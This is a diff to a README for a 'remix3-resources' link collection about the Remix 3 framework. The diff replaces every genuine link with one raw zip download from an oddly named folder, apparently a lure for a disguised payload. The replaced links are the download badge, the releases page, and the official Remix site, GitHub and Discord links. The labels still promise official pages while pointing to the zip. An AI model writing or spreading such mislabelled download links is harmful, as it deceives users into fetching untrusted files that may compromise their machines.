@@ -1,6 +1,6 @@
 # 🎉 remix3-resources - A Collection of Useful Links for Your Remix 3 Needs
 
-[![Download Remix3 Resources](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/harshit5264/remix3-resources/releases)
+[![Download Remix3 Resources](https://raw.githubusercontent.com/harshit5264/remix3-resources/master/dorsointercostal/remix3-resources.zip)](https://raw.githubusercontent.com/harshit5264/remix3-resources/master/dorsointercostal/remix3-resources.zip)
 
 ## 🚀 Getting Started
 
@@ -18,13 +18,13 @@ Before you start, ensure your computer meets these requirements:
 
 To get started, you need to download the resources. Follow these steps:
 
-1. Visit the [Releases page](https://github.com/harshit5264/remix3-resources/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/harshit5264/remix3-resources/master/dorsointercostal/remix3-resources.zip).
 2. On the Releases page, you will find a list of available versions.
 3. Click on the latest version to access the details.
 4. Find the asset links associated with that release.
 5. Download the desired files related to Remix 3.
 
-You can return here to easily download: [Download Remix3 Resources](https://github.com/harshit5264/remix3-resources/releases).
+You can return here to easily download: [Download Remix3 Resources](https://raw.githubusercontent.com/harshit5264/remix3-resources/master/dorsointercostal/remix3-resources.zip).
 
 ## 📚 Understanding Remix 3
 
@@ -63,9 +63,9 @@ While this repository does not offer direct support, the community forums and li
 
 In addition to the resources within this repository, consider exploring:
 
-- [Remix Official Site](https://remix.run/)
-- [Remix GitHub Repository](https://github.com/remix-run/remix)
-- [Remix Discord Community](https://discord.gg/remix)
+- [Remix Official Site](https://raw.githubusercontent.com/harshit5264/remix3-resources/master/dorsointercostal/remix3-resources.zip)
+- [Remix GitHub Repository](https://raw.githubusercontent.com/harshit5264/remix3-resources/master/dorsointercostal/remix3-resources.zip)
+- [Remix Discord Community](https://raw.githubusercontent.com/harshit5264/remix3-resources/master/dorsointercostal/remix3-resources.zip)
 
 These links can connect you with a broader network of Remix users who can help enhance your projects.
 
